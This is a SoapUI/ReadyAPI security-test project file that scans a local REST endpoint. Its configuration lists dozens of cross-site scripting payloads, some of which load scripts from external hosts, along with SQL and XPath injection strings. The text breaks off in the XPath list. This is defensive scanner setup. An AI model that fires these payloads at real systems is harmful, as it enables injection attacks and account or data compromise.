<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="57597405-185a-4b41-b31e-cd9c19702b30" created="2.8.0" activeEnvironment="Default environment" name="Test1" resourceRoot="" updated="3.1.0 2020-02-04T16:09:20Z" encryptionMode="Not encrypted" xmlns:con="http://eviware.com/soapui/config">
  <con:settings>
    <con:setting id="com.eviware.soapui.impl.wsdl.actions.iface.tools.support.SecurityTestRunnerAction@values-local"><![CDATA[<xml-fragment xmlns:con="http://eviware.com/soapui/config">
  <con:entry key="Report Format(s)" value="PDF"/>
  <con:entry key="Host:Port" value=""/>
  <con:entry key="Export JUnit Results" value="true"/>
  <con:entry key="Export All" value="true"/>
  <con:entry key="Save After" value="false"/>
  <con:entry key="Add Settings" value="false"/>
  <con:entry key="WSS Password Type" value=""/>
  <con:entry key="Endpoint" value=""/>
  <con:entry key="Select Report Type" value="Security Issues Report"/>
  <con:entry key="System Properties" value=""/>
  <con:entry key="Test Suite" value="&lt;all>"/>
  <con:entry key="Password" value=""/>
  <con:entry key="Print Report" value="true"/>
  <con:entry key="Open Report" value="false"/>
  <con:entry key="Security Test" value="&lt;all>"/>
  <con:entry key="Global Properties" value=""/>
  <con:entry key="Project Properties" value=""/>
  <con:entry key="Test Case" value="&lt;all>"/>
  <con:entry key="Project Password" value=""/>
  <con:entry key="Username" value=""/>
  <con:entry key="user-settings.xml Password" value=""/>
  <con:entry key="TestRunner Path" value="/Applications/ReadyAPI-3.1.0.app/Contents/Resources/app/bin"/>
  <con:entry key="Environment" value="Default environment"/>
  <con:entry key="Enable UI" value="false"/>
  <con:entry key="Root Folder" value="${WORKSPACE}"/>
  <con:entry key="Ignore Errors" value="false"/>
  <con:entry key="Domain" value=""/>
  <con:entry key="Tool Args" value=""/>
  <con:entry key="Save Project" value="false"/>
</xml-fragment>]]></con:setting>
    <con:setting id="com.eviware.soapui.impl.wsdl.actions.iface.tools.support.ProSecurityTestRunnerAction@values-local"><![CDATA[<xml-fragment xmlns:con="http://eviware.com/soapui/config">
  <con:entry key="Report Format(s)" value="PDF"/>
  <con:entry key="Host:Port" value=""/>
  <con:entry key="Export JUnit Results" value="true"/>
  <con:entry key="Export All" value="true"/>
  <con:entry key="Save After" value="false"/>
  <con:entry key="Add Settings" value="false"/>
  <con:entry key="WSS Password Type" value=""/>
  <con:entry key="Endpoint" value=""/>
  <con:entry key="Select Report Type" value="Security Issues Report"/>
  <con:entry key="System Properties" value=""/>
  <con:entry key="Test Suite" value="&lt;all>"/>
  <con:entry key="Password" value=""/>
  <con:entry key="Print Report" value="true"/>
  <con:entry key="Open Report" value="false"/>
  <con:entry key="Security Test" value="&lt;all>"/>
  <con:entry key="Global Properties" value=""/>
  <con:entry key="Project Properties" value=""/>
  <con:entry key="Test Case" value="&lt;all>"/>
  <con:entry key="Project Password" value=""/>
  <con:entry key="Username" value=""/>
  <con:entry key="user-settings.xml Password" value=""/>
  <con:entry key="TestRunner Path" value="/Applications/ReadyAPI-3.1.0.app/Contents/Resources/app/bin"/>
  <con:entry key="Environment" value="Default environment"/>
  <con:entry key="Enable UI" value="false"/>
  <con:entry key="Root Folder" value="${WORKSPACE}"/>
  <con:entry key="Ignore Errors" value="false"/>
  <con:entry key="Domain" value=""/>
  <con:entry key="Tool Args" value=""/>
  <con:entry key="Save Project" value="false"/>
</xml-fragment>]]></con:setting>
  </con:settings>
  <con:interface xsi:type="con:RestService" id="2b9e0289-05d6-4a74-ab5e-1434e2aba4bb" wadlVersion="http://wadl.dev.java.net/2009/02" name="http://localhost:1234" type="rest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT" rootPart=""/>
    <con:endpoints>
      <con:endpoint>http://localhost:1234</con:endpoint>
    </con:endpoints>
    <con:resource name="" path="" id="15ff2ab2-3aaa-4dc8-abe6-69f1b22632fb">
      <con:settings/>
      <con:parameters/>
      <con:method name="" id="b0803dee-9aac-416a-ac48-f93ac74d17d3" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:representation type="RESPONSE">
          <con:mediaType xsi:nil="true"/>
          <con:status>0</con:status>
          <con:params/>
          <con:element>data</con:element>
        </con:representation>
        <con:request name="Request 1" id="8b5061d1-caa1-47b3-9665-9d0b908e24fe" mediaType="application/json">
          <con:settings/>
          <con:endpoint>http://localhost:1234</con:endpoint>
          <con:credentials>
            <con:selectedAuthProfile>No Authorization</con:selectedAuthProfile>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:testSuite id="ec338374-8e12-4fea-8b04-9c3a9fd5dd82" name="http://localhost:1234 TestSuite">
    <con:settings/>
    <con:savedRecentRuns>1</con:savedRecentRuns>
    <con:runType>SEQUENTIAL</con:runType>
    <con:testCase id="de46c96c-7ac7-4270-b19e-acf2e78d1e0b" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="http://localhost:1234 TestCase 1" searchProperties="true" timeout="0">
      <con:settings/>
      <con:savedRecentRuns>1</con:savedRecentRuns>
      <con:testStep type="restrequest" name="Request 1" id="b505e01f-bade-4f77-8e40-c43287b79b55">
        <con:settings/>
        <con:config service="http://localhost:1234" resourcePath="" methodName="" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="Request 1" id="8b5061d1-caa1-47b3-9665-9d0b908e24fe" mediaType="application/json">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
            </con:settings>
            <con:endpoint>http://localhost:1234</con:endpoint>
            <con:request/>
            <con:originalUri>http://localhost/</con:originalUri>
            <con:assertion type="Valid HTTP Status Codes" id="7ad86c41-5ed3-4c11-9822-c3ac8863b87b" name="Valid HTTP Status Codes">
              <con:settings/>
              <con:configuration>
                <codes>200</codes>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Response SLA Assertion" id="28504a77-0d7e-4467-ad8d-b54eed908c83" name="Response SLA">
              <con:configuration>
                <SLA>200</SLA>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:selectedAuthProfile>No Authorization</con:selectedAuthProfile>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties/>
      <con:reportParameters/>
      <con:securityTest id="e15ff819-1da5-4bdd-b087-8eab6a6f2152" testCaseId="de46c96c-7ac7-4270-b19e-acf2e78d1e0b" name="SecurityTest 1" failSecurityTestOnScanErrors="true">
        <con:settings/>
        <con:testStepSecurityTest>
          <con:testStepId>b505e01f-bade-4f77-8e40-c43287b79b55</con:testStepId>
          <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="656d0f40-4de4-495b-b864-cd3c963e1235" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:assertion type="Sensitive Information Exposure" id="2c12745e-647f-45d6-a3c3-72c7c9bea245" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="5ccc054f-0534-48da-9b9c-972e7377f023" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
              <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
              <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="d330f183-8557-4bfb-9bc9-f397303b8f97" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:assertion type="CrosSiteScript" id="a502572d-d077-4a70-979a-4034afba32e5" name="Cross Site Scripting Detection">
              <con:configuration/>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="0a34c549-536b-4a5f-bc1d-8fcd8db56b1e" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:minimal>5</con:minimal>
              <con:maximal>15</con:maximal>
              <con:numberOfRequest>100</con:numberOfRequest>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="a127ef43-238e-46cc-83f8-a753bd782622" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ALL_AT_ONCE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="a5c22f95-f0e7-452b-9523-4fe03845d186" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:typesList>
                <con:type>3</con:type>
                <con:value>true</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>4</con:type>
                <con:value>GpM7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>5</con:type>
                <con:value>0FB7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>9</con:type>
                <con:value>-1E4f</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>10</con:type>
                <con:value>12.45E+12</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>11</con:type>
                <con:value>-1.23</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>12</con:type>
                <con:value>SoapUI is	 the
 best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>13</con:type>
                <con:value>P1Y2M3DT10H30M12.3S</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>14</con:type>
                <con:value>1999-05-31T13:20:00.000-05:00</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>16</con:type>
                <con:value>1999-05-31</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>22</con:type>
                <con:value>-1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>23</con:type>
                <con:value>-882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>24</con:type>
                <con:value>-2147483647</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>25</con:type>
                <con:value>-32768</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>26</con:type>
                <con:value>127</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>27</con:type>
                <con:value>0</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>28</con:type>
                <con:value>-1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>29</con:type>
                <con:value>1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>30</con:type>
                <con:value>1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>31</con:type>
                <con:value>882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>32</con:type>
                <con:value>294967295</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>33</con:type>
                <con:value>65535</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>34</con:type>
                <con:value>255</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>35</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>36</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="a8f22052-1015-47d4-a4c5-70958f0df5a5" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="cff355bc-3ce6-4222-a9a9-564b7326ca96" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="ec5a9277-8443-437c-9335-682a9fe77e67" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="0f1c9e0b-2e1d-445b-94e0-9d5ef823df20" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:xpathList>or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList>
